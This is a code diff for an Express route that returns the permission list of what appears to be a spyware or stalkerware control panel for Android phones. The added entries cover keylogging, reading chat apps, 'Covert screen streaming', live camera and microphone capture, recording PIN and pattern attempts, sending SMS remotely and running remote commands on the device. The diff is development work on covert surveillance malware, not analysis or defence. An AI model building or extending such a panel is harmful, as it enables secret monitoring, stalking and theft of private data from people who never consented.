@@ -782,29 +782,80 @@ router.delete('/:id/sessions', async (req, res) => {
 
 /**
  * GET /api/users/available-permissions
- * Get list of available permission codes
+ * Get list of available permission codes grouped by category
  */
 router.get('/meta/permissions', async (req, res) => {
     const permissions = [
-        { code: '*', name: 'All Permissions', description: 'Full access to all features (admin only)' },
-        { code: 'sms', name: 'SMS Messages', description: 'View SMS logs' },
-        { code: 'calls', name: 'Call Logs', description: 'View call history' },
-        { code: 'location', name: 'Location', description: 'View location history and map' },
-        { code: 'photos', name: 'Photos & Screenshots', description: 'View captured photos and screenshots' },
-        { code: 'notifications', name: 'Notifications', description: 'View notification logs' },
-        { code: 'keylogs', name: 'Keylogs', description: 'View keylogger data' },
-        { code: 'apps', name: 'Installed Apps', description: 'View list of installed apps' },
-        { code: 'commands', name: 'Commands', description: 'Send remote commands to device' },
-        { code: 'recordings', name: 'Recordings', description: 'Access call recordings' },
-        { code: 'files', name: 'File Manager', description: 'Browse and download files' },
-        { code: 'stream', name: 'Silent Stream', description: 'Access live screen streaming' },
-        { code: 'chat', name: 'Chat Messages', description: 'View WhatsApp, Instagram etc. messages' },
-        { code: 'contacts', name: 'Contacts', description: 'View device contacts' }
+        // Core Access
+        { code: '*', name: 'All Permissions', description: 'Full access to all features (admin only)', category: 'core' },
+
+        // Data & Monitoring
+        { code: 'sms', name: 'SMS Messages', description: 'View SMS history', category: 'monitoring' },
+        { code: 'sms_sync', name: 'Sync SMS', description: 'Sync latest or all SMS from device', category: 'commands' },
+        { code: 'sms_send', name: 'Send SMS', description: 'Send SMS from device remotely', category: 'commands' },
+        { code: 'calls', name: 'Call Logs', description: 'View call history', category: 'monitoring' },
+        { code: 'calls_sync', name: 'Sync Calls', description: 'Sync latest or all calls from device', category: 'commands' },
+        { code: 'contacts', name: 'Contacts', description: 'View device contacts', category: 'monitoring' },
+        { code: 'contacts_sync', name: 'Sync Contacts', description: 'Sync contacts from device', category: 'commands' },
+        { code: 'notifications', name: 'Notifications', description: 'View notification alerts', category: 'monitoring' },
+        { code: 'keylogs', name: 'Keylogs', description: 'View keystrokes', category: 'monitoring' },
+        { code: 'chat', name: 'Chat Apps', description: 'View WhatsApp, Instagram, Telegram messages', category: 'monitoring' },
+
+        // Location
+        { code: 'location', name: 'Location History', description: 'View GPS history', category: 'location' },
+        { code: 'location_live', name: 'Live Location', description: 'Get current location on demand', category: 'commands' },
+
+        // Media - Photos & Gallery
+        { code: 'photos', name: 'Photos & Screenshots', description: 'View captured photos and screenshots', category: 'media' },
+        { code: 'gallery', name: 'Gallery', description: 'Browse device photos and media', category: 'media' },
+        { code: 'files', name: 'File Manager', description: 'Browse and download device files', category: 'media' },
+
+        // Camera Controls
+        { code: 'camera_front', name: 'Front Camera', description: 'Capture front camera photos', category: 'camera' },
+        { code: 'camera_back', name: 'Back Camera', description: 'Capture back camera photos', category: 'camera' },
+        { code: 'screenshot', name: 'Screenshot', description: 'Take device screenshots', category: 'camera' },
+
+        // Recordings
+        { code: 'recordings', name: 'Call Recordings', description: 'Access call recordings', category: 'recordings' },
+
+        // Streaming - Granular options
+        { code: 'stream', name: 'Screen Streaming', description: 'Live screen sharing access', category: 'streaming' },
+        { code: 'stream_video', name: 'Video Only Stream', description: 'Screen video without audio', category: 'streaming' },
+        { code: 'stream_audio', name: 'Audio Only Stream', description: 'Microphone audio capture', category: 'streaming' },
+        { code: 'stream_screen', name: 'Screen Share', description: 'Screen capture stream', category: 'streaming' },
+        { code: 'stream_silent', name: 'Silent Stream', description: 'Covert screen streaming', category: 'streaming' },
+        { code: 'stream_full', name: 'Full Media Stream', description: 'Combined video and audio', category: 'streaming' },
+
+        // Live Stream (Camera + Mic)
+        { code: 'livestream', name: 'Live Camera Stream', description: 'Live camera and microphone feed', category: 'streaming' },
+
+        // Device Control
+        { code: 'phone_lock', name: 'Phone Lock', description: 'View PIN & pattern attempts', category: 'device' },
+        { code: 'apps', name: 'Installed Apps', description: 'View list of installed apps', category: 'device' },
+        { code: 'settings', name: 'Device Settings', description: 'Configure device settings', category: 'device' },
+        { code: 'logs', name: 'App Logs', description: 'View app debug logs', category: 'device' },
+
+        // Commands
+        { code: 'commands', name: 'Remote Commands', description: 'Send commands to device', category: 'commands' }
+    ];
+
+    // Group by category for UI
+    const categories = [
+        { id: 'core', name: 'Core Access', icon: 'shield' },
+        { id: 'monitoring', name: 'Data Monitoring', icon: 'eye' },
+        { id: 'location', name: 'Location', icon: 'map-pin' },
+        { id: 'media', name: 'Media & Files', icon: 'image' },
+        { id: 'camera', name: 'Camera Controls', icon: 'camera' },
+        { id: 'recordings', name: 'Recordings', icon: 'mic' },
+        { id: 'streaming', name: 'Screen Streaming', icon: 'monitor' },
+        { id: 'device', name: 'Device Control', icon: 'smartphone' },
+        { id: 'commands', name: 'Remote Commands', icon: 'terminal' }
     ];
 
     res.json({
         success: true,
-        permissions
+        permissions,
+        categories
     });
 });
 
